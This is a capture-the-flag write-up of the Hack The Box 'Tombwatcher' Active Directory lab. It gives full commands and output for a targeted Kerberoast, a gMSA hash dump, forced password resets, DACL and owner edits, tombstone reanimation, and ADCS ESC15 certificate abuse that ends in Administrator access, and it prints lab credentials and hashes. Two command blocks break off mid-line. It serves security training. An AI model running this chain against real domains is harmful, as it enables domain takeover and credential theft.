---
{"dg-publish":true,"permalink":"/ct-fs/htb/tombwatcher/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #AD #ADCS #tombstone_reanimation #ESC15 #certipy-ad #bloodhound #assumed_breach 

## Recon
![Pasted image 20261002124317.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002124317.png)
This one is an assumed breach

### Nmap:
```zsh
Nmap scan report for 10.129.232.167
Host is up (0.089s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-02 23:45:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-10-02T23:46:54+00:00; +4h00m03s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-10-02T23:46:55+00:00; +4h00m03s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-10-02T23:46:54+00:00; +4h00m03s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-10-02T23:46:55+00:00; +4h00m03s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-02T23:46:16
|_  start_date: N/A
|_clock-skew: mean: 4h00m02s, deviation: 0s, median: 4h00m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.92 seconds
```
Initial portscanning shows a series of ports related to Windows machines including kerberos, SMB, RPC, WINRM, and a webserver on port 80.
### Port 445 (SMB)
#### Manual Enumeration
```zsh
└─$ nxc smb DC01.tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' --shares             
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share
```
Checking out our initial smb access we see we have read access to some fairly typical shares that, when checked, didn't reveal anything immediately of interest.
##### Users
```
└─$ nxc smb DC01.tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' --users
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.232.167  445    DC01             Administrator                 2025-04-25 14:56:03 0       Built-in account for administering the computer/domain 
SMB         10.129.232.167  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.232.167  445    DC01             krbtgt                        2024-11-16 00:02:28 0       Key Distribution Center Service Account 
SMB         10.129.232.167  445    DC01             Henry                         2025-05-12 15:17:03 0        
SMB         10.129.232.167  445    DC01             Alfred                        2025-05-12 15:17:03 0        
SMB         10.129.232.167  445    DC01             sam                           2025-05-12 15:17:03 0        
SMB         10.129.232.167  445    DC01             john                          2025-05-19 13:25:10 0 
```
We also grab a valid list of users with `nxc` and our assumed breach creds.

### Port 80 (web)
![Pasted image 20261002125616.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002125616.png)
Visiting the webserver in the browser we are met with a generic IIS splash page.

### Port 389 (LDAP)
```zsh
└─$ nxc ldap DC01.tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' --bloodhound --collection ALL --dns-server 10.129.232.167
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        10.129.232.167  389    DC01             Resolved collection methods: rdp, container, trusts, objectprops, acl, localadmin, group, psremote, session, dcom
LDAP        10.129.232.167  389    DC01             Done in 0M 22S
LDAP        10.129.232.167  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.232.167_2026-10-02_160054_bloodhound.zip
```
I also took the opportunity to pull `bloodhound` data via `nxc ldap`.

## Initial Access (AD Misconfiguration)

### Bloodhound

![Pasted image 20261002132631.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002132631.png)
```zsh
└─$ sudo faketime -f '2026-10-02 20:21:57.104627 (-0400)' /opt/targetedKerberoast/targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --request-user ALFRED
[*] Starting kerberoast attacks
[*] Attacking user (ALFRED)
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$fe97229b8263653ec06a792d9d1706eb$811c421a6f919b0fd294b3444ce32f88538fc76296da90fa5306add414ed6e1033ca4f1cce3a58fc2fb48bf42ae3d3540201078e8cce0bfd0b5ddfc9970b0a2800974de56f66fa8369f014caa6a7067a3beb6bb5222439881488327e73e19a06d769fbdd89674dd3ed752edc94692699711d357eeb2476799e0351f998cdf9a66ed7ae262de849127ff9ce57aff114a542533143088c3a05b344541dc3a98c6b57cbe8155ad3868d9df0de0ff4c943890dbf82574958aec11cb2b7aead15cb86c9b7361498a37d07f5d1c27023577ef4f0096ef948233766097e7247ef670dd280143f83d857ec938472eba03d8ba6d219a19610b5450c3f4da7f6245848ff85e32c4dba152011e13684c3fb065893cda204732b7672ba537d3f85d105a6da1e5240dc3f5a1e35c915a3502f5228149803d724ee1ecb4466060db2bdd8e6f8cf61a4796b9cd27e81b8a336ad45d323b5333a50bf6a6172038995e02bfcf83dc24769f9fb5dd23771662adaac2eed67c948525f644bcb830992ee8cf532591bf8c2f8a8b3000049dd3ffb6cfef2be694634e0a281c7eac927029f78806340d8f97e067702d52325b5ff756027d4bc1da9ebfdcd1ee63d5c91e61750db010ba066cfed6c7c662bff508a51ed165deea67bb6f11e0b97be2c20f9a42e58e05d63dabc7e7ed0397738f9d238db90441949f2abadb3fe79a40f8a27af0be88e90fc27104730745d5166ec17e454a2025f58982d64740ad33278b7179601d9c890b4331c435eebe7fa52dbf1f254655ccceb36e985f67b4342732c98fb96bc4b1672fc5bb9ae911a4b7a78f49b4ce843d28336d138e620213fd950e98321b4b824d954c3b0beae0b425fe9534a587dd7807fdd2c7f99dfc378a3ae0c243ef2b4f77f278d9a883704ea0b2f8190c52d96b0c1e68535791a19496a8b32fbf09f6892ba736a863cb93e568d693c4c60680ea89308143dfda37f0a2388d01e1aa61fe72d75cc28bc74f4f408c5d18251d6e516a594d6eca40791a6bf756c5014eaee0da127fb414d744c265a6f3de643086085ad9b7c98b2bc218368fff28c769c4bc4bea8d2c712d1e4c2207bc9ab0f93ce3350c96a505262360d6ffe341fdda95ab699ca5e77cddc42df0c11582aaaa4e9c7281761b567680e4f34b7121e063ed5a6f68fb82034d39e2e5aa707b0eaf2b5a5fb376e3218237f281705cc2acbd3750ff2f41edf6c39bb586ba46a2e06f7e8c4e6bd91efd70ce59432cc27f4d734a6f05c759a1c6a5b83092e2c2749c2f2eed4169d092fc4d13ef4ff53839a876245313ec5f11a1254cfc0388b841059b59372d6637900d5dc4bf840ed51bb0b2a25790016fea52b02503fd147c9c03c2ad033e1d14a33aec77a0a6fe33e5cac653eb99e9745e0c6215019a9704eeea28803523893ec5aa4215acdc01b6c1db9f48e7a038ecde68737a88c51a6c89022d8f6dda7f9ed893124c3
```
From our bloodhound loot we see that our user has 1 outbound control object and that's the `WriteSPN` permission over user `Alfred`. This means we can write to the SPN attribute of Alfred. We can abuse this with a targeted kerberoast to leak his TGS hash.

```zsh
┌──(kali㉿kali)-[~/…/HTB/tombwatcher/loot/hashes]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt alfred.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2026-10-02 16:28) 33.33g/s 34133p/s 34133c/s 34133C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
We instantly crack the TGS for Alfred's plaintext password.

```zsh
┌──(kali㉿kali)-[~/…/HTB/tombwatcher/loot/hashes]
└─$ nxc smb DC01.tombwatcher.htb -u 'alfred' -p 'basketball' --shares
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\alfred:basketball 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share
```
We successfully verify our creds are working by checking `Alfred's` share access. Nothing of interest there.

![Pasted image 20261002133155.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002133155.png)
Our next piece involves Alfred's permission to `AddSelf` to the `Infrastructure` group. To do this all we need to use is `adcli`

```zsh
┌──(kali㉿kali)-[~/…/HTB/tombwatcher/loot/hashes]
└─$ adcli add-member --domain=tombwatcher.htb Infrastructure Alfred -S 10.129.232.167 -U Alfred
Password for Alfred@TOMBWATCHER.HTB: 

└─$ net rpc shell -U 'tombwatcher.htb/alfred%basketball' -S "DC01.tombwatcher.htb"
Talking to domain TOMBWATCHER (S-1-5-21-1392491010-1358638721-2126982587)
net rpc> user
net rpc user> info alfred
Domain Users
Infrastructure
net rpc user> 

```
We confirm that we successfully add `Alfred` to the Infrastructure group in AD.

![Pasted image 20261002135506.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002135506.png)
We see now that our outbound control as a member of Infrastructure now includes the `ReadGMSAPassword` permission bit set for the service account `ANSIBLE_DEV$`. This means we can easily retrieve the password for this account which may give us even more control as service accounts typically have unusual/elevated permissions in AD.

```zsh
└─$ python3 gMSADumper.py -u 'Alfred' -p 'basketball' -d 'tombwatcher.htb'       
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::3eca34dd13a85db79c03178b7b149621
ansible_dev$:aes256-cts-hmac-sha1-96:e9e2850abbdbd04b6f09aa9dea6ab0504a9e4e4f98435bc987f1f90d0faaca81
ansible_dev$:aes128-cts-hmac-sha1-96:f1e40e3681fdae0d4a8eaf098469115
```
We successfully dump the NT hash for `ansible_dev$` with `gMSADumper.py`

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/tombwatcher/exploit]
└─$ nxc smb DC01.tombwatcher.htb -u 'ansible_dev
And we confirm that the hash is good by logging in via pass-the-hash over smb on `nxc`. 

![Pasted image 20261002140129.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002140129.png)
Bloodhound shows us that as `ansible_dev$` we have the `ForceChangePassword` permission set over user `sam`. This permission set is self explanatory but we'll be able to set Sam's password to whatever we want now.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/tombwatcher/exploit]
└─$ pth-net rpc password 'Sam' 'Password123!' -U 'tombwatcher.htb/ansible_dev$%ffffffffffffffffffffffffffffffff:3eca34dd13a85db79c03178b7b149621' -S "DC01.tombwatcher.htb"
gensec_gse_client_prepare_ccache: Kinit for ansible_dev$@TOMBWATCHER.HTB to access cifs/DC01.tombwatcher.htb failed: Preauthentication failed: NT_STATUS_LOGON_FAILURE
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/tombwatcher/exploit]
└─$ nxc smb DC01.tombwatcher.htb -u 'sam' -p 'Password123!'                                      
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\sam:Password123!
```
We successfully changed `Sam's` password on the server.

![Pasted image 20261002141844.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002141844.png)
Next we see that Sam has the `WriteOwner` permission set for user `John`. This will allow us to abuse those permissions to get access as `John`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/tombwatcher/exploit]
└─$ impacket-owneredit -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb/sam:Password123!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!

```
We successfully change owner ship of `John's` user to `Sam`. We can now abuse this by delegating the `GenericAll` Permission set and changing `John's` password from there.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/tombwatcher/exploit]
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb/sam:Password123!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
[*] DACL backed up to dacledit-20261002-172539.bak
[*] DACL modified successfully!
```
We then successfully give Sam `GenericAll` permissions over user `John` with `impacket-dacledit`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/tombwatcher/exploit]
└─$ net rpc password 'john' 'Password123!' -U 'tombwatcher.htb/sam%Password123!' -S 'DC01.tombwatcher.htb'

└─$ nxc smb DC01.tombwatcher.htb -u 'john' -p 'Password123!'                                              
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\john:Password123!
```
Finally we change `John's` password with `net rpc` and confirm it successfully doing so by logging in over smb with `nxc`.

![Pasted image 20261002142928.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261002142928.png)
We see that John has two very interesting things tied to his user. One is that he's a member of Remote Management which means he should be able to get a shell on the system. Second is his `GenericAll` permissions over the ADCS OU. This may lead to finding some ADCS exploit under our John user's context.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/tombwatcher/exploit]
└─$ evil-winrm -i DC01.tombwatcher.htb -u john -p 'Password123!'  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> dir ../Desktop


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/2/2026   7:41 PM             34 user.txt

```
And just as suspected, `user.txt` is waiting for us in John's Desktop folder.

## Privilege Escalation (Tombstone + ADCS Abuse)

![Pasted image 20261005133355.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261005133355.png)
Moving to John's other interesting permission set, we target `GenericAll` over the ADCS OU. 

```zsh
ldapsearch -x -H 'ldap://DC01.tombwatcher.htb' -D 'john@tombwatcher.htb' -w 'Password123!' -b 'OU=ADCS,DC=tombwatcher,DC=htb' -s 'sub' '(objectClass=*)' 'sAMAccountName' 'objectClass'

# extended LDIF
#
# LDAPv3
# base <OU=ADCS,DC=tombwatcher,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: sAMAccountName objectClass 
#

# ADCS, tombwatcher.htb
dn: OU=ADCS,DC=tombwatcher,DC=htb
objectClass: top
objectClass: organizationalUnit

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
Running a basic ldap recursive search against the ADCS OU as `john` we see that it's completely empty. This works as a blank slate for a couple different privilege escalation scenarios. They both involve us creating a new machine object within AD and assigning it to the ADCS OU.

#### Tangent (Object Injection)
```zsh
└─$ impacket-addcomputer -dc-ip 'DC01.tombwatcher.htb' -computer-name 'ATTACKMOD
We accomplish this successfully with `impacket-addcomputer` and specifying the OU name inside the `-computer-group` flag.

```zsh
└─$ certipy-ad find -u 'ATTACKMOD$@tombwatcher' -p 'Password123!' -dc-ip 10.129.232.167 -target 10.129.232.167
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving text output to '20261005163333_Certipy.txt'
[*] Wrote text output to '20261005163333_Certipy.txt'
[*] Saving JSON output to '20261005163333_Certipy.json'
[*] Wrote JSON output to '20261005163333_Certipy.json'
```
since this is an ADCS OU my first instinct is to then run a general ADCS find query for our newly made machine object inside the OU.
```zsh
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "tombwatcher-CA-1",
      "DNS Name": "DC01.tombwatcher.htb",
      "Certificate Subject": "CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb",
      "Certificate Serial Number": "3428A7FC52C310B2460F8440AA8327AC",
      "Certificate Validity Start": "2024-11-16 00:47:48+00:00",
      "Certificate Validity End": "2123-11-16 00:57:48+00:00",
      "Web Enrollment": {
        "http": {
          "enabled": false
        },
        "https": {
          "enabled": false,
          "channel_binding": null
        }
      },
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
      "Permissions": {
        "Owner": "TOMBWATCHER.HTB\\Administrators",
        "Access Rights": {
          "1": [
            "TOMBWATCHER.HTB\\Administrators",
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins"
          ],
          "2": [
            "TOMBWATCHER.HTB\\Administrators",
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins"
          ],
          "512": [
            "TOMBWATCHER.HTB\\Authenticated Users"
          ]
---SNIP---

  },
    "17": {
      "Template Name": "WebServer",
      "Display Name": "Web Server",
      "Certificate Authorities": [
        "tombwatcher-CA-1"
      ],
      "Enabled": true,
      "Client Authentication": false,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        1
      ],
      "Extended Key Usage": [
        "Server Authentication"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 1,
      "Validity Period": "2 years",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2024-11-16 00:57:49+00:00",
      "Template Last Modified": "2024-11-16 17:07:26+00:00",
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins",
            "S-1-5-21-1392491010-1358638721-2126982587-1111"
          ]
        },
        "Object Control Permissions": {
          "Owner": "TOMBWATCHER.HTB\\Enterprise Admins",
          "Full Control Principals": [
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins",
            "S-1-5-21-1392491010-1358638721-2126982587-1111"
          ]
        }
      }
    }

```
Combing back through the output we see something interesting we missed previously. We see that the `Web Server` template in ADCS gives enrollment rights to a specific account using it's Domain SID rather than username. 

### Tombstone Reanimation

```zsh

*Evil-WinRM* PS C:\Users> Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -IncludeDeletedObjects -Properties objectGUID, LastKnownParent


Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf

```
We can get information on an AD object (in this case an account) using built-in powershell commands from our previous session as `john`. In querying the system with the SID specified from the template in ADCS we see a deleted account for the user `cert_admin`. In that information we see that the account used to reside within the `ADCS` OU. That means if we can make it active again, we will have full control of the account via `John`.

```zsh
*Evil-WinRM* PS C:\Users> Get-ADObject -Filter 'objectGUID -eq "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"' -IncludeDeletedObjects | Restore-ADObject
 
*Evil-WinRM* PS C:\Users> Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -IncludeDeletedObjects -Properties objectGUID, LastKnownParent


Deleted           :
DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf

```
Since this account is deleted and likely has it's AD recycle bin disabled, we must perform a [Tombstone Reanimation](https://www.ibm.com/docs/en/storage-protect/8.2.2?topic=rwiado-reanimate-tombstone-objects-restoring-from-system-state-backup) on the account in order to make it active again. We do so successfully within Powershell.

```zsh
┌──(kali㉿kali)-[~/…/tombwatcher/files/bloodhound/attackmod]
└─$ net rpc password 'cert_admin' 'Password123!' -U 'tombwatcher.htb/john%Password123!' -S 'DC01.tombwatcher.htb'
```
Finally we force change `cert_admin's` password since we've no idea what the original one is and now have control over the user.

```zsh
    "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins",
            "TOMBWATCHER.HTB\\cert_admin"
          ]
        },
        "Object Control Permissions": {
          "Owner": "TOMBWATCHER.HTB\\Enterprise Admins",
          "Full Control Principals": [
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "TOMBWATCHER.HTB\\Domain Admins",
            "TOMBWATCHER.HTB\\Enterprise Admins",
            "TOMBWATCHER.HTB\\cert_admin"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "TOMBWATCHER.HTB\\cert_admin"
      ],
      "[!] Vulnerabilities": {
        "ESC15": "Enrollee supplies subject and schema version is 1.",
        "ESC17": "Enrollee supplies subject and template allows server authentication."
      },
      "[*] Remarks": {
        "ESC15": "Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.",
        "ESC17": "Other prerequisites may be required for this to be exploitable. See the wiki for more details."
      
```
Now when we view the ADCS information for the Web Server template we get two possible vulnerabilities: [ESC15](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) and [ESC17](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication). 


### ESC15
>[!info]
>![Pasted image 20261005143645.png](/img/user/CTFs/HTB/Images/Tombwatcher%20Images/Pasted%20image%2020261005143645.png)
Our template in question not only fills the template prerequisites, but also even is the template used in the example (Web Sever).

```zsh
──(kali㉿kali)-[~/…/tombwatcher/files/bloodhound/attackmod]
└─$ certipy-ad req \                                                                                             
    -u 'cert_admin@tombwatcher.htb' -p 'Password123!' \
    -dc-ip '10.129.232.167' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' \
    -application-policies 'Client Authentication'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
We can execute this vulnerability via `certipy-ad` and specifying the `administrator` as our user and `Client Authentication` as the application policy that we wish to inject which would allow us then to authenticate via this enrollment template with the credential file we generate for `administrator`.

```zsh
┌──(kali㉿kali)-[~/…/tombwatcher/files/bloodhound/attackmod]
└─$ certipy-ad auth -pfx administrator.pfx -username 'administrator' -dc-ip 10.129.232.167 -ldap-shell
    
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Connecting to 'ldaps://10.129.232.167:636'
[*] Authenticated to '10.129.232.167' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# whoami
u:TOMBWATCHER\Administrator

# change_password Administrator password
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: password
Password changed successfully
